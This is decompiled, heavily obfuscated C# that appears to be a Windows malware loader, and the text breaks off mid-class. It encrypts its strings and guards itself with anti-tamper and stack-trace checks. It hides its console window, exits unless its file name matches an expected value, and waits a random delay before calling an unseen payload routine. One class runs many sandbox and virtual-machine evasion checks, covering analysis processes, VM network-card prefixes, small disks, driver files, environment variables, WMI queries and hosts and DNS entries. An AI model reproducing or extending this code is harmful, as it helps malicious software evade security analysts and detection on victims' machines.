using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

internal static class _0002
{
}
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
[DebuggerNonUserCode]
internal sealed class _0002_2005
{
	private static ResourceManager m__0002;

	private static CultureInfo _000E;

	internal _0002_2005()
	{
	}

	internal static ResourceManager _0002()
	{
		if (_0002_2005.m__0002 == null)
		{
			_0002_2005.m__0002 = new ResourceManager(_0002_0015._0002(1787740136), typeof(_0002_2005).Assembly);
		}
		return _0002_2005.m__0002;
	}

	internal static CultureInfo _0002()
	{
		return _000E;
	}

	internal static void _0002(CultureInfo _0002)
	{
		_000E = _0002;
	}
}
internal interface _0003<_0002> : _000E
{
	global::_0005<_0002> GetEnumerator();
}
internal static class _0003_2005
{
	[StructLayout(LayoutKind.Auto)]
	private struct _0002 : IAsyncStateMachine
	{
		public int _0002;

		public AsyncTaskMethodBuilder _000E;

		private TaskAwaiter _0003;

		private _000E_2005 _0006;

		private TaskAwaiter<bool> _000F;

		private void MoveNext()
		{
			int num = _0002;
			try
			{
				TaskAwaiter awaiter;
				if (num != 0)
				{
					if (num == 1)
					{
						goto IL_0088;
					}
					awaiter = Task.Delay(new Random().Next(1000, 3000)).GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = (_0002 = 0);
						_0003 = awaiter;
						_000E.AwaitUnsafeOnCompleted(ref awaiter, ref this);
						return;
					}
				}
				else
				{
					awaiter = _0003;
					_0003 = default(TaskAwaiter);
					num = (_0002 = -1);
				}
				awaiter.GetResult();
				_0006 = new _000E_2005();
				goto IL_0088;
				IL_0088:
				try
				{
					TaskAwaiter<bool> awaiter2;
					if (num != 1)
					{
						awaiter2 = _0006._0002().GetAwaiter();
						if (!awaiter2.IsCompleted)
						{
							num = (_0002 = 1);
							_000F = awaiter2;
							_000E.AwaitUnsafeOnCompleted(ref awaiter2, ref this);
							return;
						}
					}
					else
					{
						awaiter2 = _000F;
						_000F = default(TaskAwaiter<bool>);
						num = (_0002 = -1);
					}
					awaiter2.GetResult();
				}
				catch
				{
				}
				finally
				{
					if (num < 0 && _0006 != null)
					{
						((IDisposable)_0006).Dispose();
					}
				}
				_0006 = null;
			}
			catch (Exception exception)
			{
				_0002 = -2;
				_000E.SetException(exception);
				return;
			}
			_0002 = -2;
			_000E.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine _0002)
		{
			_000E.SetStateMachine(_0002);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(_0002);
		}
	}

	[DllImport("kernel32.dll", EntryPoint = "GetConsoleWindow")]
	private static extern IntPtr _0002();

	[DllImport("user32.dll", EntryPoint = "ShowWindow")]
	private static extern bool _0002(IntPtr _0002, int _000E);

	[DllImport("kernel32.dll", EntryPoint = "FreeConsole")]
	private static extern bool _0002();

	[DllImport("user32.dll", EntryPoint = "MessageBox")]
	private static extern int _0002(IntPtr _0002, string _000E, string _0003, uint _0006);

	[STAThread]
	private static void _0002()
	{
		if (!Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName).Contains(_0002_0015._0002(1787739370)))
		{
			_0002();
			IntPtr intPtr = _0002();
			if (intPtr != IntPtr.Zero)
			{
				_0002(intPtr, 0);
			}
			_0002(IntPtr.Zero, _0002_0015._0002(1787739389), _0002_0015._0002(1787739120), 16u);
			Environment.Exit(1);
		}
		else
		{
			_0002();
			IntPtr intPtr2 = _0002();
			if (intPtr2 != IntPtr.Zero)
			{
				_0002(intPtr2, 0);
			}
			_0002().GetAwaiter().GetResult();
		}
	}

	private static async Task _0002()
	{
		await Task.Delay(new Random().Next(1000, 3000));
		using _000E_2005 obj = new _000E_2005();
		try
		{
			await obj._0002();
		}
		catch
		{
		}
	}
}
internal interface _0005<_0002> : _0006, _000F
{
	[SpecialName]
	new _0002 _0006_2002_2001_0002();
}
internal static class _0005_2005
{
	private sealed class _0002
	{
		private int m__0002;

		private int _000E;

		internal _0002()
		{
			_0002(0L);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal long _0002()
		{
			if ((object)Assembly.GetCallingAssembly() != typeof(_0002).Assembly)
			{
				return 2918384L;
			}
			if (!_0005_2005._0002())
			{
				return 2918384L;
			}
			int[] array = new int[4];
			array[3] = -(~(-(~(-(~(~(-(~-842584388))))))));
			array[1] = -(~(-(~(-(~(~(-(-(~(~-1751248107))))))))));
			array[2] = -(~(~(-(-(~(-(~(~-1370179214))))))));
			array[0] = ~(-(-(~(~(-(~(-(~-78197416))))))));
			int num = this.m__0002;
			int num2 = _000E;
			int num3 = ~(-(-(~(~(-(~(-(~1640531524))))))));
			int num4 = -(~(-(~(-(~(~(-(-(~(~957401314))))))))));
			for (int i = 0; i != 32; i++)
			{
				num2 -= (((num << 4) ^ (num >> 5)) + num) ^ (num4 + array[(num4 >> 11) & 3]);
				num4 -= num3;
				num -= (((num2 << 4) ^ (num2 >> 5)) + num2) ^ (num4 + array[num4 & 3]);
			}
			for (int j = 0; j != 4; j++)
			{
				array[j] = 0;
			}
			ulong num5 = (ulong)((long)num2 << 32);
			return (long)(num5 | (uint)num);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal void _0002(long _0002)
		{
			if ((object)Assembly.GetCallingAssembly() == typeof(_0002).Assembly && _0005_2005._0002())
			{
				int[] array = new int[4];
				array[1] = -(~(~(-(-(~(-(~(~-1751248108))))))));
				array[0] = -(~(~(-(-(~(-(~(-(~(~-78197411))))))))));
				array[2] = -(~(-(~(~(-(~(-(-(~(~-1370179215))))))))));
				array[3] = -(~(-(~(~(-(~(-(-(~(~-842584389))))))))));
				int num = ~(-(-(~(~(-(~(-(~1640531524))))))));
				int num2 = (int)_0002;
				int num3 = (int)(_0002 >> 32);
				int num4 = 0;
				for (int i = 0; i != 32; i++)
				{
					num2 += (((num3 << 4) ^ (num3 >> 5)) + num3) ^ (num4 + array[num4 & 3]);
					num4 += num;
					num3 += (((num2 << 4) ^ (num2 >> 5)) + num2) ^ (num4 + array[(num4 >> 11) & 3]);
				}
				for (int j = 0; j != 4; j++)
				{
					array[j] = 0;
				}
				this.m__0002 = num2;
				_000E = num3;
			}
		}
	}

	private sealed class _0002_2005
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0005_2005._000E._0002(_0005_2005._0002(typeof(_0002_2005)), _0005_2005._000E._0003(_0005_2005._000E._000E(_0005_2005._0002(typeof(_0008)), _0005_2005._0002(typeof(_0003))), _0005_2005._000E._0003(_0005_2005._0002(typeof(_0006)) ^ -(~(-(~(~(-(~(-(~(-(~1090129049)))))))))), _0008._0002())));
		}
	}

	private sealed class _0003
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0005_2005._000E._0003(_0005_2005._000E._000E(_0005_2005._0002(typeof(_000F)), _0005_2005._000E._0003(_0005_2005._0002(typeof(_0003)), _0005_2005._0002(typeof(_0008)))), _0002_2005._0002());
		}
	}

	private sealed class _0005
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0005_2005._000E._0003(_0005_2005._0002(typeof(_0005)), _0005_2005._000E._0002(_0005_2005._0002(typeof(_0003)), _0005_2005._000E._000E(_0005_2005._0002(typeof(_000F)), _0005_2005._000E._0003(_0005_2005._0002(typeof(_0006)), _0005_2005._000E._0002(_0005_2005._0002(typeof(_0008)), _0005_2005._0002(typeof(_0002_2005)))))));
		}
	}

	private sealed class _0006
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0005_2005._000E._0003(_0005_2005._000E._0002(_000F._0002() ^ -(~(~(-(-(~(~(-(~(-(~-527758448)))))))))), _0005_2005._0002(typeof(_0005))), _0005_2005._000E._000E(_0005_2005._0002(typeof(_0003)) ^ _0005_2005._0002(typeof(_0002_2005)), ~(-(-(~(~(-(~(-(~1293805853))))))))));
		}
	}

	private sealed class _0008
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0005_2005._000E._000E(_0005_2005._000E._000E(_0006._0002(), _0005_2005._000E._0002(_0005_2005._0002(typeof(_0008)), _000F._0002())), _0005_2005._0002(typeof(_0002_2005)));
		}
	}

	private static class _000E
	{
		internal static int _0002(int _0002, int _000E)
		{
			return _0002 ^ (_000E - -(~(~(-(-(~(-(~(~1659838906)))))))));
		}

		internal static int _000E(int _0002, int _000E)
		{
			return (_0002 - ~(-(-(~(~(-(~(-(~690632063))))))))) ^ (_000E + -(~(~(-(~(-(~(-(-(~(~-492465004)))))))))));
		}

		internal static int _0003(int _0002, int _000E)
		{
			return _0002 ^ ((_000E - -(~(~(-(~(-(~(-(~-40726752))))))))) ^ (_0002 - _000E));
		}
	}

	private sealed class _000F
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0005_2005._000E._0002(_0005_2005._0002(typeof(_0006)), _0005_2005._0002(typeof(_0005)) ^ _0005_2005._000E._000E(_0005_2005._0002(typeof(_000F)), _0005_2005._000E._0003(_0005_2005._0002(typeof(_0002_2005)), _0005._0002())));
		}
	}

	private static _0002 m__0002 = new _0002();

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static long _0002()
	{
		if ((object)Assembly.GetCallingAssembly() != typeof(_0005_2005).Assembly || !_0002())
		{
			return 0L;
		}
		lock (_0005_2005.m__0002)
		{
			long num = _0005_2005.m__0002._0002();
			if (num == 0)
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				List<byte> list = new List<byte>();
				AssemblyName assemblyName;
				try
				{
					assemblyName = executingAssembly.GetName();
				}
				catch
				{
					assemblyName = new AssemblyName(executingAssembly.FullName);
				}
				byte[] array = assemblyName.GetPublicKeyToken();
				if (array != null && array.Length == 0)
				{
					array = null;
				}
				if (array != null)
				{
					list.AddRange(array);
				}
				list.AddRange(Encoding.Unicode.GetBytes(assemblyName.Name));
				int num2 = _0002(typeof(_0005_2005));
				int num3 = _0003._0002();
				list.Add((byte)num2);
				list.Add((byte)(num3 >> 16));
				list.Add((byte)(num2 >> 24));
				list.Add((byte)num3);
				list.Add((byte)(num2 >> 8));
				list.Add((byte)(num3 >> 24));
				list.Add((byte)(num2 >> 16));
				list.Add((byte)(num3 >> 8));
				int count = list.Count;
				ulong num4 = 0uL;
				for (int i = 0; i != count; i++)
				{
					num4 += list[i];
					num4 += num4 << 20;
					num4 ^= num4 >> 12;
					list[i] = 0;
				}
				num4 += num4 << 6;
				num4 ^= num4 >> 22;
				num4 += num4 << 30;
				num = (long)num4;
				num ^= 0x241173EF1E7D0799L;
				_0005_2005.m__0002._0002(num);
			}
			return num;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static bool _0002()
	{
		if (!_000E())
		{
			return false;
		}
		return true;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static bool _000E()
	{
		StackTrace stackTrace = new StackTrace();
		Type type = (stackTrace.GetFrame(3)?.GetMethod())?.DeclaringType;
		if ((object)type == typeof(RuntimeMethodHandle))
		{
			return false;
		}
		if ((object)type == null)
		{
			return false;
		}
		if ((object)type.Assembly != typeof(_0005_2005).Assembly)
		{
			return false;
		}
		return true;
	}

	private static int _0002(Type _0002)
	{
		return _0002.MetadataToken;
	}
}
internal interface _0006
{
	bool _0006_2002_2001_0002();

	object _0006_2002_2001_0002();

	void _0006_2002_2001_0002();
}
public sealed class _0006_2005 : IDisposable
{
	private sealed class _0002
	{
		public string _0002;

		internal string _0002(int _0002)
		{
			return this._0002.Substring(_0002 * 2, 2);
		}
	}

	private sealed class _000E
	{
		public string _0002;

		internal bool _0002(string _0002)
		{
			return this._0002.Contains(_0002);
		}
	}

	private bool m__0002;

	private readonly object m__000E = new object();

	private readonly CancellationTokenSource m__0003 = new CancellationTokenSource();

	private readonly SemaphoreSlim m__0006 = new SemaphoreSlim(1, 1);

	private bool m__000F;

	private DateTime m__0005 = DateTime.MinValue;

	private int m__0008;

	private readonly string[] m__0002_2005 = new string[2]
	{
		_0002_0015._0002(1787739047),
		_0002_0015._0002(1787739056)
	};

	private readonly string[] m__000E_2005 = new string[3]
	{
		_0002_0015._0002(1787739038),
		_0002_0015._0002(1787738989),
		_0002_0015._0002(1787739004)
	};

	private readonly string[] m__0003_2005 = new string[3]
	{
		_0002_0015._0002(1787738995),
		_0002_0015._0002(1787738945),
		_0002_0015._0002(1787738960)
	};

	private readonly string[] m__0006_2005 = new string[3]
	{
		_0002_0015._0002(1787738941),
		_0002_0015._0002(1787738885),
		_0002_0015._0002(1787738861)
	};

	public _0006_2005()
	{
		this.m__0005 = DateTime.UtcNow;
	}

	public bool _0002()
	{
		lock (this.m__000E)
		{
			return this.m__0002;
		}
	}

	private void _0002(bool _0002)
	{
		lock (this.m__000E)
		{
			this.m__0002 = _0002;
		}
	}

	public DateTime _0002()
	{
		return this.m__0005;
	}

	public int _0002()
	{
		return this.m__0008;
	}

	public bool _000E()
	{
		this.m__0008++;
		this.m__0005 = DateTime.UtcNow;
		_0002(_0002: false);
		_0002();
		_000E();
		_0003();
		_0006();
		_000F();
		_0005();
		_0008();
		_0002_2005();
		_000E_2005();
		_0003_2005();
		return this._0002();
	}

	private void _0002()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				string value = processes[i].ProcessName.ToLower() + _0002_0015._0002(1787740118);
				if (this.m__0002_2005.Contains(value))
				{
					_0002(_0002: true);
					break;
				}
			}
		}
		catch
		{
		}
	}

	private void _000E()
	{
		try
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				_0002 obj = new _0002();
				obj._0002 = networkInterface.GetPhysicalAddress().ToString();
				if (string.IsNullOrEmpty(obj._0002))
				{
					continue;
				}
				obj._0002 = obj._0002.ToLower();
				string text = string.Join(_0002_0015._0002(1787738864), Enumerable.Range(0, obj._0002.Length / 2).Select(obj._0002));
				string[] array = this.m__000E_2005;
				foreach (string value in array)
				{
					if (text.StartsWith(value))
					{
						_0002(_0002: true);
						return;
					}
				}
			}
		}
		catch
		{
		}
	}

	private void _0003()
	{
		try
		{
			DriveInfo driveInfo = new DriveInfo(_0002_0015._0002(1787738824));
			if (driveInfo.IsReady && driveInfo.TotalSize < 42949672960L)
			{
				_0002(_0002: true);
			}
		}
		catch
		{
		}
	}

	private void _0006()
	{
		try
		{
			string path = _0002_0015._0002(1787738816);
			string[] array = this.m__0003_2005;
			foreach (string path2 in array)
			{
				if (File.Exists(Path.Combine(path, path2)))
				{
					_0002(_0002: true);
					break;
				}
			}
		}
		catch
		{
		}
	}

	private void _000F()
	{
		try
		{
			string[] array = m__0006_2005;
			for (int i = 0; i < array.Length; i++)
			{
				if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable(array[i])))
				{
					_0002(_0002: true);
					break;
				}
			}
		}
		catch
		{
		}
	}

	private void _0005()
	{
		try
		{
			string obj = Environment.MachineName?.ToLower() ?? string.Empty;
			string text = Environment.UserName?.ToLower() ?? string.Empty;
			string text2 = Environment.UserDomainName?.ToLower() ?? string.Empty;
			if (obj.Contains(_0002_0015._0002(1787738787)) || text.Contains(_0002_0015._0002(1787738787)) || text2.Contains(_0002_0015._0002(1787738787)))
			{
				_0002(_0002: true);
			}
			if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable(_0002_0015._0002(1787738861))))
			{
				_0002(_0002: true);
			}
		}
		catch
		{
		}
	}

	private void _0008()
	{
		try
		{
			if ((Environment.SystemDirectory?.ToLower() ?? string.Empty).Contains(_0002_0015._0002(1787738787)))
			{
				_0002(_0002: true);
			}
			string[] source = new string[3]
			{
				_0002_0015._0002(1787738800),
				_0002_0015._0002(1787738782),
				_0002_0015._0002(1787738746)
			};
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				_000E obj = new _000E();
				obj._0002 = process.ProcessName.ToLower();
				if (source.Any(obj._0002))
				{
					_0002(_0002: true);
					break;
				}
			}
		}
		catch
		{
		}
	}

	private void _0002_2005()
	{
		try
		{
			if (Environment.UserName.Equals(_0002_0015._0002(1787738718), StringComparison.OrdinalIgnoreCase))
			{
				_0002(_0002: true);
			}
		}
		catch
		{
		}
	}

	private void _000E_2005()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(_0002_0015._0002(1787738663));
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						string text = ((ManagementBaseObject)(ManagementObject)enumerator.Current)[_0002_0015._0002(1787738618)] as string;
						if (!string.IsNullOrEmpty(text) && text.Equals(_0002_0015._0002(1787738570), StringComparison.OrdinalIgnoreCase))
						{
							_0002(_0002: true);
							return;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val).Dispose();
			}
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (networkInterface.OperationalStatus != OperationalStatus.Up)
				{
					continue;
				}
				foreach (IPAddress dnsAddress in networkInterface.GetIPProperties().DnsAddresses)
				{
					string text2 = dnsAddress.ToString();
					if (!string.IsNullOrEmpty(text2) && text2.ToLower().Contains(_0002_0015._0002(1787738570)))
					{
						_0002(_0002: true);
						return;
					}
				}
			}
			string path = Path.Combine(Environment.SystemDirectory, _0002_0015._0002(1787738587), _0002_0015._0002(1787738537), _0002_0015._0002(1787738531));
			if (File.Exists(path) && File.ReadAllText(path).ToLower().Contains(_0002_0015._0002(1787738570)))
			{
				_0002(_0002: true);
			}
		}
		catch
		{
		}
	}

	private void _0003_2005()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(_0002_0015._0002(1787738551));
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.Current;
						string text = (((ManagementBaseObject)val2)[_0002_0015._0002(1787738472)] as string) ?? string.Empty;
						string text2 = (((ManagementBaseObject)val2)[_0002_0015._0002(1787738492)] as string) ?? string.Empty;
						if (text.ToLower().Contains(_0002_0015._0002(1787738787)) || text2.ToLower().Contains(_0002_0015._0002(1787738787)))
						{
							_0002(_0002: true);
							return;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val).Dispose();
			}
			ManagementObjectSearcher val3 = new ManagementObjectSearcher(_0002_0015._0002(1787738447));
			try
			{
				ManagementObjectEnumerator enumerator = val3.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						string text3 = ((ManagementBaseObject)(ManagementObject)enumerator.Current)[_0002_0015._0002(1787738492)] as string;
						if (!string.IsNullOrEmpty(text3) && text3.ToLower().Contains(_0002_0015._0002(1787738787)))
						{
							_0002(_0002: true);
							break;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val3).Dispose();
			}
		}
		catch
		{
		}
	}

	public void Dispose()
	{
		_0006_2005_2002_2001_000E(_0002: true);
		GC.SuppressFinalize(this);
	}

	protected virtual void _0006_2005_2002_2001_000E(bool _0002)
	{
		if (!this.m__000F)
		{
			if (_0002)
			{
				this.m__0003?.Cancel();
				this.m__0003?.Dispose();
				this.m__0006?.Dispose();
			}
			this.m__000F = true;
		}
	}
}
internal static class _0008
{
	internal sealed class _0002 : global::_0003<int>, global::_000E, global::_0005<int>, _000F, _0006
	{
		private int m__0002;

		private int m__000E;

		private int _0003;

		private int _0006;

		public int _000F;

		private int _0005;

		private int _0008;

		private global::_0005<int> _0002_2005;

		private int _000E_2005;

		[DebuggerHidden]
		public _0002(int _0002)
		{
			this.m__0002 = _0002;
			_0003 = Thread.CurrentThread.ManagedThreadId;
		}

		[DebuggerHidden]
		private void _0002_2002_2001_0002()
		{
			int num = m__0002;
			if (num == -3 || num == 1)
			{
				try
				{
				}
				finally
				{
					_000E();
				}
			}
			_0002_2005 = null;
			m__0002 = -2;
		}

		void _000F._000F_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			this._0002_2002_2001_0002();
		}

		private bool _0006_2002_2001_0002()
		{
			bool result;
			try
			{
				switch (m__0002)
				{
				default:
					result = false;
					goto end_IL_0000;
				case 0:
					m__0002 = -1;
					_0005 = 0;
					_0008 = 1;
					_0002_2005 = ((global::_0003<int>)new _000E(-2)).GetEnumerator();
					m__0002 = -3;
					break;
				case 1:
					m__0002 = -3;
					_0006--;
					if (_0006 != 0)
					{
						int num = _0008;
						_0008 = (num + _0005 + _0006) ^ (-1358275320 + _000E_2005);
						_0005 = num;
						break;
					}
					result = false;
					_000E();
					goto end_IL_0000;
				}
				if (((_0006)_0002_2005)._0006_2002_2001_0002())
				{
					_000E_2005 = _0002_2005._0006_2002_2001_0002();
					this.m__000E = _0008;
					m__0002 = 1;
					result = true;
				}
				else
				{
					_000E();
					_0002_2005 = null;
					result = false;
				}
				end_IL_0000:;
			}
			catch
			{
				//try-fault
				_0002_2002_2001_0002();
				throw;
			}
			return result;
		}

		bool _0006._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0006_2002_2001_0002();
		}

		private void _000E()
		{
			m__0002 = -1;
			if (_0002_2005 != null)
			{
				_0002_2005._000F_2002_2001_0002();
			}
		}

		[DebuggerHidden]
		private int _0002_2002_2001_0002()
		{
			return this.m__000E;
		}

		int global::_0005<int>._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0002_2002_2001_0002();
		}

		[DebuggerHidden]
		private void _0002_2002_2001_0003()
		{
			throw new NotSupportedException();
		}

		void _0006._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			this._0002_2002_2001_0003();
		}

		[DebuggerHidden]
		private object _0002_2002_2001_0002()
		{
			return this.m__000E;
		}

		object _0006._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0002_2002_2001_0002();
		}

		[DebuggerHidden]
		private global::_0005<int> _0002_2002_2001_0002()
		{
			_0002 obj;
			if (m__0002 == -2 && _0003 == Thread.CurrentThread.ManagedThreadId)
			{
				m__0002 = 0;
				obj = this;
			}
			else
			{
				obj = new _0002(0);
			}
			obj._0006 = _000F;
			return obj;
		}

		global::_0005<int> global::_0003<int>.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0002_2002_2001_0002();
		}

		[DebuggerHidden]
		private _0006 _0002_2002_2001_0002()
		{
			return _0002_2002_2001_0002();
		}

		_0006 global::_000E._000E_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0002_2002_2001_0002();
		}
	}

	internal sealed class _0003 : global::_0003<int>, global::_000E, global::_0005<int>, _000F, _0006
	{
		private int _0002;

		private int m__000E;

		private int m__0003;

		private int _0006;

		public int _000F;

		private int _0005;

		private global::_0005<int> _0008;

		[DebuggerHidden]
		public _0003(int _0002)
		{
			this._0002 = _0002;
			m__0003 = Thread.CurrentThread.ManagedThreadId;
		}

		[DebuggerHidden]
		private void _0003_2002_2001_0002()
		{
			int num = _0002;
			if (num == -3 || num == 1)
			{
				try
				{
				}
				finally
				{
					_000E();
				}
			}
			_0008 = null;
			_0002 = -2;
		}

		void _000F._000F_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			this._0003_2002_2001_0002();
		}

		private bool _0006_2002_2001_0002()
		{
			bool result;
			try
			{
				switch (_0002)
				{
				default:
					result = false;
					goto end_IL_0000;
				case 0:
				{
					_0002 = -1;
					_0005 = 7;
					int num = _0006;
					_0008 = ((global::_0003<int>)new _0002(-2)
					{
						_000F = num
					}).GetEnumerator();
					_0002 = -3;
					break;
				}
				case 1:
					_0002 = -3;
					if (_0005 != 0)
					{
						break;
					}
					result = false;
					_000E();
					goto end_IL_0000;
				}
				if (((_0006)_0008)._0006_2002_2001_0002())
				{
					int num2 = _0008._0006_2002_2001_0002() ^ _0006;
					if ((num2 & 3) == 0)
					{
						num2 ^= 0x778BF18C;
					}
					int num3 = _0005 - 1;
					_0005 = num3;
					if ((num2 & 0xF) == 0)
					{
						num2 ^= -1189707964;
					}
					this.m__000E = num2;
					_0002 = 1;
					result = true;
				}
				else
				{
					_000E();
					_0008 = null;
					result = false;
				}
				end_IL_0000:;
			}
			catch
			{
				//try-fault
				_0003_2002_2001_0002();
				throw;
			}
			return result;
		}

		bool _0006._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0006_2002_2001_0002();
		}

		private void _000E()
		{
			_0002 = -1;
			if (_0008 != null)
			{
				_0008._000F_2002_2001_0002();
			}
		}

		[DebuggerHidden]
		private int _0003_2002_2001_0002()
		{
			return this.m__000E;
		}

		int global::_0005<int>._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0003_2002_2001_0002();
		}

		[DebuggerHidden]
		private void _0003_2002_2001_0003()
		{
			throw new NotSupportedException();
		}

		void _0006._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			this._0003_2002_2001_0003();
		}

		[DebuggerHidden]
		private object _0003_2002_2001_0002()
		{
			return this.m__000E;
		}

		object _0006._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0003_2002_2001_0002();
		}

		[DebuggerHidden]
		private global::_0005<int> _0003_2002_2001_0002()
		{
			_0003 obj;
			if (_0002 == -2 && m__0003 == Thread.CurrentThread.ManagedThreadId)
			{
				_0002 = 0;
				obj = this;
			}
			else
			{
				obj = new _0003(0);
			}
			obj._0006 = _000F;
			return obj;
		}

		global::_0005<int> global::_0003<int>.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0003_2002_2001_0002();
		}

		[DebuggerHidden]
		private _0006 _0003_2002_2001_0002()
		{
			return _0003_2002_2001_0002();
		}

		_0006 global::_000E._000E_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0003_2002_2001_0002();
		}
	}

	internal sealed class _000E : global::_0003<int>, global::_000E, global::_0005<int>, _000F, _0006
	{
		private int _0002;

		private int m__000E;

		private int _0003;

		private int _0006;

		[DebuggerHidden]
		public _000E(int _0002)
		{
			this._0002 = _0002;
			_0003 = Thread.CurrentThread.ManagedThreadId;
		}

		[DebuggerHidden]
		private void _000E_2002_2001_0002()
		{
			_0002 = -2;
		}

		void _000F._000F_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			this._000E_2002_2001_0002();
		}

		private bool _0006_2002_2001_0002()
		{
			int num = _0002;
			if (num != 0)
			{
				if (num != 1)
				{
					return false;
				}
				_0002 = -1;
				_0006 += _0006;
				if (_0006 == 64)
				{
					_0006 = 5;
				}
			}
			else
			{
				_0002 = -1;
				_0006 = 1;
			}
			m__000E = _0006;
			_0002 = 1;
			return true;
		}

		bool _0006._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._0006_2002_2001_0002();
		}

		[DebuggerHidden]
		private int _000E_2002_2001_0002()
		{
			return m__000E;
		}

		int global::_0005<int>._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._000E_2002_2001_0002();
		}

		[DebuggerHidden]
		private void _000E_2002_2001_000E()
		{
			throw new NotSupportedException();
		}

		void _0006._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			this._000E_2002_2001_000E();
		}

		[DebuggerHidden]
		private object _000E_2002_2001_0002()
		{
			return m__000E;
		}

		object _0006._0006_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._000E_2002_2001_0002();
		}

		[DebuggerHidden]
		private global::_0005<int> _000E_2002_2001_0002()
		{
			if (_0002 == -2 && _0003 == Thread.CurrentThread.ManagedThreadId)
			{
				_0002 = 0;
				return this;
			}
			return new _000E(0);
		}

		global::_0005<int> global::_0003<int>.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
			return this._000E_2002_2001_0002();
		}

		[DebuggerHidden]
		private _0006 _000E_2002_2001_0002()
		{
			return _000E_2002_2001_0002();
		}

		_0006 global::_000E._000E_2002_2001_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in   
